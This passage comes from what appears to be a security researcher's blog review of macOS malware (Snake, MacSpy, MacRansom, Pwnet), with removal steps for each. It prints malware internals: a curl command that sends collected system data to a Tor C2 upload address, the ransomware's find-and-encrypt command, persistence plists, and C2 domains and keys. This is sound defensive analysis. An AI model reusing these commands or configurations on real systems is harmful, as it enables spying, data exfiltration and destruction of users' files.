  000000010013cf20         db         "Usage: <b>snake_test</b> <queue-file> e[vent]|n[ormal]\n", 0 

  000000010013cf7d         db         "../../../snake/<b>snake_test.c</b>", 0</pre>
  </span>
  </div>
  <br>
  They also note that though Snake binaries contain obfuscated strings (possibly commands or config data?), in the macOS version there are only "<i>placeholders that are yet to be replaced by the actual values, which is another indication that this Snake binary is not yet ready to deploy to targets.</i>"
  <br>
  <br>

  So what does the Snake actual do? This is a good question! First, if we look at the Windows version (which has been well studied by the anti-virus industry), holy $h!t its legit! Seriously, go read the reports about this malware and it's operations:

  <ul style="list-style-type:square">
      <li><a class="inlineLink" href="https://securelist.com/the-epic-turla-operation/65545/">"The Epic Turla Operation"</a> (Kaspersky)</li>
      <li><a class="inlineLink" href="https://securelist.com/satellite-turla-apt-command-and-control-in-the-sky/72081/">"Satellite Turla: APT Command and Control in the Sky"</a> (Kaspersky)</li>
      <li><a class="inlineLink" href="https://www.baesystems.com/en/cybersecurity/feature/the-snake-campaign">"The Snake Campaign"</a> (BAE Systems)</li>
  </ul>
  0days, successful penetration of classified networks, C&amp;C via satellite link hijacking....in a way, stunningly beautiful!
  <br>
  <br>in
  Back to Mac version though...honestly it's tough to know the extent of it's capabilities. 
  <br><br>
  First, as already noted, it does not appear to be ready to deploy. Thus it's possible that features or capabilities have not yet been implemented or configured in the macOS version. For example, the malware contains a function named, <span class="n3rdFont">hide_module</span>. Looking at it's disassembly however, we can see it's not (yet?) implemented:
  <div style="border: 1px solid gray; margin-top:15px; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  hide_module:
    00000001000093d0         push       rbp
    00000001000093d1         mov        rbp, rsp
    00000001000093d4         pop        rbp
    00000001000093d5         ret</pre>
  </span>
  </div>
  <br>
  Second, as Snake is part of a incredibly sophisticated cyber-espionage operation, we've seen operators (on the Windows side of the house), utilize capabilities in a modular fashion. Looking at function names within the <span class="n3rdFont">installdp</span> binary, it appears to support a similar modular-based plugin architecture:
  <br><br>
    <span><img src="../images/blog/blog_0x25/snakeModules.png" width="303" style="display:block; margin:auto;"/></span>
  <br> 
  This means that analyzing any single component of malware individually (i.e. just the <span class="n3rdFont">installdp</span> binary), may be akin to looking at a single piece of a complex puzzle. Rather hard to get a full understanding. 
  <br><br>
  Finally, the Fox-IT report states that:
  <div style="border: 1px solid gray; margin-top:15px; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  "<i>Builds of Snake generally contain a Queue file. Queue files are used to store Snake's 
  configuration data, module binaries and queued network packets</i>".</pre>
  </span>
  </div>
  <br>
  And while the macOS sample does contain such a queue file, I am not sure how to decrypt or understand it fully. Note that the Fox-IT researchers dump some its content and extract "transport chains":
  <div style="border: 1px solid gray; margin-top:15px; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  $ python MM_snake_queuefile.py queue
  OFFSET STREAM TYPE ID SIZE WRITTEN DATA
  2017-02-10 12:23:22 '\x98\xa7w{\xc7\xcc4\x03-\xdcz\x0b\xc9,`\x1c'
  2017-02-10 12:23:22 '\x90*\xa6\xc5c\x89H\xe2>\x9fS\x1f\xb2\x0b\xf8\xb7'
  2017-02-10 12:23:22 '\x95\x9a\xdf\x82\xf8l\xbe.YR)\xcc\x1a{\xac\x8f'
  2017-02-10 12:23:22 '300000\x00'
  2017-02-10 12:23:22 '600000\x00'
  2017-02-10 12:23:22 '20000\x00'
  2017-02-10 12:23:22 '4096\x00'
  2017-02-10 12:23:22 '65536\x00'
  2017-02-10 12:23:22 '4096\x00'
  2017-02-10 12:23:22 '65536\x00'
  2017-02-10 12:23:22 '1000\x00'
  2017-02-10 12:23:22 '\xfb \xb20\x87\xb9m\xa2\x80!\x80\xcc\x1aJbX'
  2017-02-10 12:23:22 '0xfd4488e9\x00'
  2017-02-10 12:23:22 '0\x00'
  2017-02-10 12:23:22 '2\x00'
  2017-02-10 12:23:22 'enc.unix//tmp/.gdm-socket\x00'
  2017-02-10 12:23:22 'enc.frag.reliable.doms.unix//tmp/.gdm-selinux\x00'
  2017-02-10 12:23:22 'read_peer_nfo=Y,psk=!HqACg3ILQd-w7e4\x00'
  2017-02-10 12:23:22 'psk=R@gw1gBsRP!5!yj0\x00'
  2017-02-10 12:23:23 '1\x00'
  2017-02-10 12:23:23 'enc.http.tcp/car-service.effers.com:80\x00'
  2017-02-10 12:23:23 'psk=1BKQ55n6#OsIgwn*,ustart=bc41f8cd.0\x00'
  2017-02-10 12:23:23 '1\x00'
  2017-02-10 12:23:23 'enc.http.tcp/car-service.effers.com:80\x00'
  2017-02-10 12:23:23 'psk=1BKQ55n6#OsIgwn*,ustart=bc41f8cd.0\x00'</pre>
  </span>
  </div>
  <br>
  However, we can still get some insight into the malware's features. For example there are various functions in the malware (name: <span class="n3rdFont">snake_cmd*</span>), that appear to support standard backdoor features or capabilities such as reading/writing files, executing commands, listing running processes, and surveying an infected system:
  <br><br>
    <span><img src="../images/blog/blog_0x25/snakeCmds.png" width="425" style="display:block; margin:auto;"/></span>
  <br> 
  Taking a closer look, say at the  <span class="n3rdFont">snake_cmd_kill</span> command, we can see that invokes the <span class="n3rdFont">kill</span> API to terminate a process:
  <div style="border: 1px solid gray; margin-top:15px; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  int _snake_cmd_kill() {
    rbx = rdx;
    rcx = _data_from_params(rbx, 0x2, 0x2, &amp;var_C, 0x4);
    rax = 0x21590065;
    if (rcx != 0x0) {
            var_10 = 0x9;
            _data_from_params(rbx, 0x6, 0x2, &amp;var_10, 0x4);
            rcx = <b>kill</b>(var_C, var_10);
            rax = 0x0;
            if (rcx == 0xffffffff) {
                    rax = rcx;
            }
    }
    return rax;
  }</pre>
  </span>
  </div>
  <br>
  The implant also appears to support more advanced features, such as the ability to execute libraries directly from memory, via the <span class="n3rdFont">NSCreateObjectFileImageFromMemory</span> and <span class="n3rdFont">NSLinkModule</span> APIs:
  <div style="border: 1px solid gray; margin-top:15px; font-size: 14px;">
  <span class="n3rdFont">
  <pre>
  int _LdrInjectLibraryA(int arg0, int arg1, int arg2) {
    r14 = r9;
    r15 = arg2;
    r12 = arg1;
    rbx = arg0;
    if (rbx != 0x0) {
            rcx = sign_extend_64(getpid());
            rax = 0x21590001;
            if (rcx == rbx) {
                    var_28 = 0x0;
                    rcx = NSCreateObjectFileImageFromMemory(r12, r15, &var_28);
                    rax = 0xffffffff;
                    if (rcx == 0x1) {
                            rax = NSLinkModule(0x0, "", 0x7);
                            *r14 = rax;
                            CMP(rax, 0x1);
                            rax = rax - rax + CARRY(RFLAGS(cf));
                    }
            }
    }
    else {
            var_28 = 0x0;
            rcx = NSCreateObjectFileImageFromMemory(r12, r15, &var_28);
            rax = 0xffffffff;
            if (rcx == 0x1) {
                    rax = NSLinkModule(0x0, "", 0x7);
                    *r14 = rax;
                    CMP(rax, 0x1);
                    rax = rax - rax + CARRY(RFLAGS(cf));
            }
    }
    return rax;
  }</pre>
  </span>
  </div>
  <br>
  For more info on directly executing binaries from memory, see: <a class="inlineLink" href="https://blog.cylance.com/running-executables-on-macos-from-memory">"Running Executables on macOS From Memory"</a>
  <br>
  <br>
  Finally, if you're still doubting the potential of this malware, note that it <span class="n3rdFont">"car-service.effers.com"</span> is the domain (as pointed out by Fox-IT) which the macOS version of Snake is configured to utilize for HTTP network transport. Why is this interesting? Because "<i>the resolving IP belongs to a Satellite communications provider</i>" ... did somebody say satellite-based C&amp;C? 
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/disinfect.png" height="32">
      <span style="vertical-align:middle">disinfection:</span>
  </div>
  As this version of OSX/Snake simply persists as a Launch Daemon, it's trivial to removed from an infected system.
  <ol>
    <li>Unload the malware's persistent Daunch Daemon via the <span class="n3rdFont">'launchctl unload'</span> command:
      <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
      <span class="n3rdFont">
      $ launchctl unload /Library/LaunchDaemons/com.adobe.update<br>
      </span>
      </div>
    </li>
    <br>
    <li>Remove the malicious Launch Daemon plist file <span class="n3rdFont">/Library/LaunchDaemons/com.adobe.update</span></li>
    <br>
    <li>Remove the malware's persistent script (<span class="n3rdFont">installd.sh</span>), and binary (<span class="n3rdFont">installdp</span>), and queue file (<span class="n3rdFont">queue</span>), from the <span class="n3rdFont">/Library/Scripts</span> directory
    </li>
  </ol>
  Honestly though, if you're infected with OSX/Snake - due to the sophistication of the actors associated with this malware, you should <i>at a minimum</i> fully <a class="inlineLink" href="https://support.apple.com/en-us/HT204904 ">re-install macOS</a>! Better yet, just burn everything down and start over.
  <br>
  <br>

  <!-- Mac Spy -->

  <br>
  <br>
  <a id="MacSpy"></a>
  <table>
  <thead>
  <tr style="border:none;">
    <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
    <img src="../images/blog/blog_0x25/macSpy.png" width="32" style="padding-top: 10px;"/> 
    <span style="display: inline-block; vertical-align: top; padding-top: 12px; font-variant: small-caps; font-size: 20px;">
    MacSpy
    </span>
    </th>
  </tr>
  </thead>
  <tbody>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">June, Catalin Cimpanu (<a class="inlineLink" href="https://twitter.com/campuscodi">@campuscodi</a>) </td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">n/a</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">fully-featured backdoor, with the ability to collect keystrokes, screenshots, audio, &amp; more.</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>disinfection:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">remove launch agent</td>
  </tr>

  <tr style="border:none;">
    <td style="border:none; vertical-align:top;"><b>writeups:</b></td>
    <td style="border:none;">
      
      <ul style="list-style-type:square">
        <li><a class="inlineLink" href="https://www.alienvault.com/blogs/labs-research/macspy-os-x-rat-as-a-service">"MacSpy: OS X RAT as a Service"</a> (AlienVault)</li>
        <li><a class="inlineLink" href="https://blog.malwarebytes.com/malwarebytes-news/2017/06/new-mac-malware-as-a-service-offerings/">"New Mac Malware-as-a-Service offerings"</a> (MalwareBytes)</li>
      </ul>


    </td>
  </tr>
  </tbody>
  </table>
  <br>
  MacSpy is (AFAIK) the first 'Malware-as-a-Service' (MaaS) for macOS. Offered on the 'dark web' it's a fairly standard backdoor (RAT), though does support a wide range of features such as collecting keystrokes, screenshots, audio, clipboard data, and more.
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/infection.png" height="32">
      <span style="vertical-align:middle">infection:</span>
  </div>
  As MacSpy is offered by the author as a pre-built binary (i.e. 'Malware-as-a-Service'), it is up to the consumer of the malware to find a way to infect target computers. As noted in <a class="inlineLink" href="https://www.alienvault.com/blogs/labs-research/macspy-os-x-rat-as-a-service">AlienVault's</a> writeup, the malware author suggests manually copying it to target mac, then manually executing it:

  <br><br>
    <span><img src="../images/blog/blog_0x25/macSpyInstall.png" style="display:block; margin:auto;"/></span>
  <br> 

  Using <a class="inlineLink" href="https://objective-see.com/products/whatsyoursign.html">WhatsYourSign</a>, we can see this malware's binary image is not signed:
  
  <br><br>
    <span><img src="../images/blog/blog_0x25/macSpyUnsigned.png" style="display:block; margin:auto;"/></span>
  <br> 
  As such, Gatekeeper should block the malware from executing - unless the user (or attacker locally installing the malware) explicitly agrees to allow the unsigned malicious code to execute.
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/persistence.png" height="32">
      <span style="vertical-align:middle">persistence:</span>
  </div>
  MacSpy persists as a LaunchAgent. When executed, the malware will dynamically build the launch agent plist (see <span class="n3rdFont">sub_10008c510</span>):
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
    <span class="n3rdFont">
    <pre>
  void sub_10008c510() {
    xmm0 = intrinsic_punpcklqdq(zero_extend_64("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"), zero_extend_64(0x27));
    var_40 = intrinsic_movdqa(var_40, xmm0);
    var_30 = 0x0;
    sub_1002f3030("&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ... &amp;var_40);
    if ((var_38 &amp; 0x3fffffffffffffff) != 0x0) {
            sub_1002f3030("&lt;plist version=\"1.0\"&gt;\n", 0x16, 0x0, &amp;var_40);
    ...

    if ((var_38 &amp; 0x3fffffffffffffff) != 0x0) {
            rcx = &amp;var_40;
            sub_1002f3030("\t\t&lt;key&gt;Program&lt;/key&gt;\n", 0x15, 0x0, rcx);
    }

    ...

    if ((var_38 &amp; 0x3fffffffffffffff) != 0x0) {
            sub_1002f3030("\t\t&lt;key&gt;RunAtLoad&lt;/key&gt;\n", 0x17, 0x0, &amp;var_40);
    }</pre>
    </span>
    </div>
    <br>
    This plist is saved to <span class="n3rdFont">~/Library/LaunchAgents/com.apple.webkit.plist</span>. As the <span class="n3rdFont">RunAtLoad</span> key is set to <span class="n3rdFont">true</span>, the value in <span class="n3rdFont">Program</span> key will be executed automatically whenever the user logs in. The value of this key is set to <span class="n3rdFont">~/Library/.DS_Stores/updated</span>, which is a persistent copy of the malware:

    <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
    <span class="n3rdFont">
    <pre>
  $ cat ~/Library/LaunchAgents/com.apple.webkit.plist

  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
  &lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; ...&gt;
  &lt;plist version=&quot;1.0&quot;&gt;
    &lt;dict&gt;
        &lt;key&gt;Label&lt;/key&gt;
        &lt;string&gt;com.apple.webkit&lt;/string&gt;
        &lt;key&gt;Program&lt;/key&gt;
        &lt;string&gt;<b>/Users/user/Library/.DS_Stores/updated</b>&lt;/string&gt;
        &lt;key&gt;ProgramArguments&lt;/key&gt;
        &lt;array&gt;
            &lt;string&gt;daemon&lt;/string&gt;
        &lt;/array&gt;
        &lt;key&gt;RunAtLoad&lt;/key&gt;
        &lt;true/&gt;
        &lt;key&gt;KeepAlive&lt;/key&gt;
        &lt;true/&gt;
    &lt;/dict&gt;
  &lt;/plist&gt;</pre>
  </span>
  </div>
  <br>
    <br>
    <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/features.png" height="32">
      <span style="vertical-align:middle">features:</span>
    </div>
    MacSpy claims to be the "most sophisticated Mac spyware":
    <br><br>
    <span><img src="../images/blog/blog_0x25/macSpy.jpg" width="800px;" style="display:block; margin:auto;"/></span>
    <br> 
    However Thomas Reed <a class="inlineLink" href="https://blog.malwarebytes.com/malwarebytes-news/2017/06/new-mac-malware-as-a-service-offerings/">notes</a> that in reality "MacSpy is fairly simple spyware, which gathers data into temporary files and sends those files periodically back to a Tor command &amp; control (C&amp;C) server via unencrypted http." 
    <br>
    <br>
    One thing is for sure, MacSpy does supports a decent set for features designed to 'spy' or collect data about infected systems. Its author kindly documented its features:
    <br><br>
    <span><img src="../images/blog/blog_0x25/macSpyFeatures.png" style="display:block; margin:auto;"/></span>
    <br>  
    A paid version of the malware apparently contains even more features, such as full exfiltration capabilities, ransomware abilities, and access to social media data:
    <br><br>
    <span><img src="../images/blog/blog_0x25/macSpyAdvancedFeatures.png" style="display:block; margin:auto;"/></span>
    <br>  
    <br>
    Other 'features' of the MacSpy include anti-debugging and anti-VM logic. As AlienVault notes in their <a class="inlineLink" href="https://www.alienvault.com/blogs/labs-research/macspy-os-x-rat-as-a-service">writeup</a>, this includes: 
    <ul style="list-style-type:square">
      <li>invoking <span class="n3rdFont">ptrace</span> with <span class="n3rdFont">PT_DENY_ATTACH</span> to prevent debuggers (such as <span class="n3rdFont">lldb</span>) from attaching </li>
      <br>
      <li>invoking <span class="n3rdFont">sysctl</span> with <span class="n3rdFont">KERN_PROC</span> and <span class="n3rdFont">KERN_PROC_PID</span>, then checking if the <span class="n3rdFont">P_TRACED</span> flag is set, to detect runtime debugging</li>
      <br>
      <li>checking to make sure it's executing on a system with at more than one CPU, and least 4GB of memory (on most default virtual machine images, this check will fail).</li>
      <br>
      <li>checking to make sure it's executing on a machine with a model contain 'Mac'. On a virtual machine, this check will fail:

    <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
    <span class="n3rdFont">
    <pre>
  $ sysctl hw.model
  hw.model: <b>VMware7,1</b></pre>
    </span>
    </div>
    </li>
  </ul>
  In terms of exfiltration, MacSpy utilizes Tor. The malware ships with various legitimate Tor binaries (named <span class="n3rdFont">webkitproxy</span> and <span class="n3rdFont">libevent-2.0.5.dylib</span>) that allow it to connect to the Tor network. Specifically it sets up a local Tor proxy and utilizes <span class="n3rdFont">curl</span> in order to route all it's traffic to it's Tor-based C&amp;C server. 
  <br>
  <br>
  Here's an example of MacSpy exfiltrating various survey data (stored by the malware in <span class="n3rdFont">~/Library/.DS_Stores/data/tmp/SystemInfo</span>):
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
    <span class="n3rdFont">
    <pre>
  /usr/bin/curl --fail -m 25 --socks5-hostname 127.0.0.1:47905 -ks -X POST -H key:<KEY> -H 
    type:system -H Content-Type:multipart/form-data 
    -F system=@'<b>/Users/user/Library/.DS_Stores/data/tmp/SystemInfo</b>' 
    http://&lt;redacted>&gt;.onion/upload</pre>
  </span>
</div>

<br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/disinfect.png" height="32">
      <span style="vertical-align:middle">disinfection:</span>
  </div>
  MacSpy can easily be removed from an infected system, via the following steps:
  <ol>
    <li>Unload the malware's persistent launch agent via the <span class="n3rdFont">'launchctl unload'</span> command:
      <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
      <span class="n3rdFont">
        <pre>
  $ launchctl unload ~/Library/LaunchAgents/com.apple.webkit.plist<br></pre>
      </span>
      </div>

    </li>
    <br>
    <li>Remove the malicious launch agent plist file <span class="n3rdFont">~/Library/LaunchAgents/com.apple.webkit.plist</span></li>
    <br>
    <li>Remove the directory, <span class="n3rdFont">/Library/.DS_Stores/updated</span>, created by the malware that contains it's persistent backdoor and other components.
  </ol>

  <!-- Mac Ransom -->

  <br>
  <br>
  <a id="MacRansom"></a>
  <table>
  <thead>
  <tr style="border:none;">
    <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
    <img src="../images/blog/blog_0x25/fileCoder.png" width="32" style="padding-top: 10px;"/> 
    <span style="display: inline-block; vertical-align: top; padding-top: 12px; font-variant: small-caps; font-size: 20px;">
    MacRansom
    </span>
    </th>
  </tr>
  </thead>
  <tbody>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">June, Fortinet</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">n/a</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">persistent ransomware</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>disinfection:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">remove launch agent</td>
  </tr>

  <tr style="border:none;">
    <td style="border:none; vertical-align:top;"><b>writeups:</b></td>
    <td style="border:none;">
      
      <ul style="list-style-type:square">
        <li><a class="inlineLink" href="https://www.fortinet.com/blog/threat-research/macransom-offered-as-ransomware-as-a-service.html">"MacRansom: Offered as Ransomware as a Service"</a> (Fortinet)</li>
        <li><a class="inlineLink" href="https://objective-see.com/blog/blog_0x1E.html">"MacRansom: Analyzing the Latest Ransomware to Target Macs"</a> (Objective-See)</li>
      </ul>


    </td>
  </tr>
  </tbody>
  </table>
  <br>
  MacRansom is the the first 'Ransomware-as-a-Service' for macOS, that aims to encrypt (ransom) all user's files. Likely created by the same author who coded up <a class="inlineLink" href="#MacSpy">MacSpy</a>, it was similarly offered on the 'dark web' for download.
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/infection.png" height="32">
      <span style="vertical-align:middle">infection:</span>
  </div>
  MacRansom is offered by the author, on Tor, as a pre-built binary (i.e. 'Malware-as-a-Service'):
  <br><br>
    <span><img src="../images/blog/blog_0x25/macRansomPortal.png" style="display:block; margin:auto;"/></span>
  <br> 
  It is up to the consumer of the malware to find a way to infect target computers. 
  <br>
  <br>
  The Fortinet researchers corresponded with the malware author who noted that in order to infect a victim that malware should be run (manually) off a USB stick: 
  <br><br>
    <span><img src="../images/blog/blog_0x25/macRansomInfect.png" width="800px;" style="display:block; margin:auto;"/></span>
  <br> 
  Rather lame...but of course 'consumers' of the malware could deploy it in other manners (e.g. email attachments, etc.).
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/persistence.png" height="32">
      <span style="vertical-align:middle">persistence:</span>
  </div>
  MacRansom persists as a LaunchAgent. It does this by:
    <ol>
    <li>
    Copying itself to <span class="n3rdFont">~/Library/.FS_Store</span> 
    </li><br>
    <li>
    Decoding an embedded plist and writing it out to <span class="n3rdFont">~/Library/LaunchAgents/com.apple.finder.plist</span>:
    <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
    <span class="n3rdFont"> 
    cat ~/Library/LaunchAgents/com.apple.finder.plist<br> 
    <br>
      &lt;plist version=&quot;1.0&quot;&gt;<br>
      &lt;dict&gt;<br>
      &nbsp;&nbsp;&lt;key&gt;Label&lt;/key&gt;<br>
      &nbsp;&nbsp;&lt;string&gt;com.apple.finder&lt;/string&gt;<br>
      &nbsp;&nbsp;&lt;key&gt;StartInterval&lt;/key&gt;<br>
      &nbsp;&nbsp;&lt;integer&gt;120&lt;/integer&gt;<br>
      &nbsp;&nbsp;&lt;key&gt;RunAtLoad&lt;/key&gt;<br>
      &nbsp;&nbsp;&lt;true/&gt;<br>
      &nbsp;&nbsp;&lt;key&gt;ProgramArguments&lt;/key&gt;<br>
      &nbsp;&nbsp;&lt;array&gt;<br>
      &nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;bash&lt;/string&gt;<br>
      &nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;-c&lt;/string&gt;<br>
      &nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;! pgrep -x .FS_Store &amp;&amp; ~/Library/.FS_Store&lt;/string&gt;<br>
      &nbsp;&nbsp;&lt;/array&gt;<br>
      &lt;/dict&gt;<br>
      &lt;/plist&gt;<br>
    </span>
    </div>
    </li>
    </ol>
    As the '<span class="n3rdFont">RunAtLoad</span>'' key is set to '<span class="n3rdFont">true</span>' the malware will be automatically started whenever the user logs in. Specifically the OS will execute the value of the '<span class="n3rdFont">ProgramArguments'</span> key: <span class="n3rdFont">bash -c ! pgrep -x .FS_Store &amp;&amp; ~/Library/.FS_Store</span>. This command will first check to make sure the malware isn't already running, then will start the malware (<span class="n3rdFont">~/Library/.FS_Store</span>).
    <br>
    <br>
    Lucky for Objective-See users, <a class="inlineLink" href="https://objective-see.com/products/blockblock.html">BlockBlock</a> will alert you about this persistent attempt:
    <br><br>
    <span><img src="../images/blog/blog_0x1E/bbAlert.png" width="800" style="display:block; margin:auto;"/></span>
    <br>
    As the malware first attempts to persist before encrypting any files, clicking 'Block' on the BlockBlock alert will stop the malware before it's done any damage :)
    <br>
    <br>
    <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/features.png" height="32">
      <span style="vertical-align:middle">features:</span>
    </div>
    As it's name suggest, MacRansom will ransom (encrypt) users files. Once up and running it checks to see if it's hit a 'trigger' date. That is, it checks if the current time is past a hard-coded value. According to the Fortinet report, this is set by the malware author (part of the 'ransomware as a service'). If the current time is before this date, the malware will not encrypt (ransom) any files, and instead will exit:
    <br><br>
    <span><img src="../images/blog/blog_0x1E/timeCheck.png" width="600" style="display:block; margin:auto;"/></span>
    <br>    
    However, if the trigger date has been hit, ransoming commences! Specifically at address <span class="n3rdFont">0x000000010b4eb5f5</span>, the malware executes the following, via <span class="n3rdFont">system</span> to begin encrypting the user's files:
    <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;"">
    <span class="n3rdFont">
    (lldb)<br>  
    Process 7280 stopped<br>
    * thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over<br>
    <br>
    frame #0: 0x000000010b4eb5f5 .FS_Store`___lldb_unnamed_symbol1$$.FS_Store + 1541<br>
  &nbsp;&nbsp;->  0x10b4eb5f5 <+1541>: callq  0x10b4ec8fe               ; symbol stub for: system<br>
    &nbsp;&nbsp;0x10b4eb5fa <+1546>: movaps 0x151f(%rip), %xmm0<br>
    &nbsp;&nbsp;0x10b4eb601 <+1553>: movaps %xmm0, -0x850(%rbp)<br>
    &nbsp;&nbsp;0x10b4eb608 <+1560>: movb   $0x0, -0x840(%rbp)<br>
    <br>
  (lldb) x/s $rdi<br>
  0x7fff547123e0: "find /Volumes ~ ! -path "/Users/user/Library/.FS_Store"  -type f -size +8c -user `whoami` -perm -u=r -exec "/Users/user/Library/.FS_Store"  {}  +"
    </span>
    </div>
    <br>
    What does this command do?
    <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
    <span class="n3rdFont"> 
    find /Volumes ~ ! -path "/Users/user/Library/.FS_Store"  -type f -size +8c -user `whoami` -perm -u=r -exec "/Users/user/Library/.FS_Store"  {}  +
    <br>
    </span>
    </div>
    <br>
    First, returns a list of user files that are readable and bigger than 8 bytes. Then these files will be passed (to a new instance) of the malware, in order to be encrypted! We can observe this encryption via a utility such as <span class="n3rdFont">fs_usage</span>:
    <div style="padding: 10px; margin-top:10px; background-color:black; color:lime;">
    <span class="n3rdFont"> 
    access  (_W__)    /Users/user/Desktop/pleaseDontEncryptMe.txt<br>
    open    F=50      (RW____)  /Users/user/Desktop/pleaseDontEncryptMe.txt<br>
    WrData[AT1]  D=0x018906a8  /Users/user/Desktop/pleaseDontEncryptMe.txt<br>
    </span>
    </div>
    <br>
    The actual encryption routine of the malware begins at <span class="n3rdFont">0x0000000100002160</span>. This function is invoked indirectly via a call to '<span class="n3rdFont">pthread_create()</span>':
    <br><br>
    <span><img src="../images/blog/blog_0x1E/ptrace.png" width="600" style="display:block; margin:auto;"/></span>
    <br> 
    As noted by Fortinet, the encryption is not some RSA-based scheme, but rather uses a symmetric cryptographic algorithm. Unfortunately (for users) though there is a static key (<span class="n3rdFont">0x39A622DDB50B49E9</span>), Joven and Chin Yick Low state that for each file the key is "permuted with a random generated number." Moreover, this random permutation is not saved nor conveyed to the attacker. 
    <br><br>
    Thus it appears that once encrypted, the files are pretty much gone for good (save for a perhaps a brute force decryption attack).
    <br>
    <br>
    Good news, <a class="inlineLink" href="https://objective-see.com/products/ransomwhere.html">RansomWhere?</a> can generically detect at block this attack:
    <br><br>
    <span><img src="../images/blog/blog_0x1E/rwAlert.png" width="433" style="display:block; margin:auto;"/></span>
    <br>
    <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/disinfect.png" height="32">
      <span style="vertical-align:middle">disinfection:</span>
  </div>
  MacRansom can easily be removed from an infected system, via the following steps:
  <ol>
    <li>Unload the malware's persistent launch agent via the <span class="n3rdFont">'launchctl unload'</span> command:
      <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
      <span class="n3rdFont">
        <pre>
  $ launchctl unload ~/Library/LaunchAgents/com.apple.finder.plist<br></pre>
      </span>
      </div>

    </li>
    <br>
    <li>Remove the malicious launch agent plist file <span class="n3rdFont">~/Library/LaunchAgents/com.apple.finder.plist</span></li>
    <br>
    <li>Remove the directory, <span class="n3rdFont">/Library/.FS_Store/</span>. This directory was created by the malware and contains it's persistent binary and other components.
  </ol>

  <!-- Pwnet -->

  <br>
  <br>
  <a id="Pwnet"></a>
  <table>
  <thead>
  <tr style="border:none;">
    <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
    <img src="../images/blog/blog_0x25/pwnet.png" width="32" style="padding-top: 10px;"/> 
    <span style="display: inline-block; vertical-align: top; padding-top: 12px; font-variant: small-caps; font-size: 20px;">
    Pwnet
    </span>
    </th>
  </tr>
  </thead>
  <tbody>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">August, SentinelOne</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">trojanized 'CS:GO hack'</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">cryptocurrency miner</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>disinfection:</b></td>
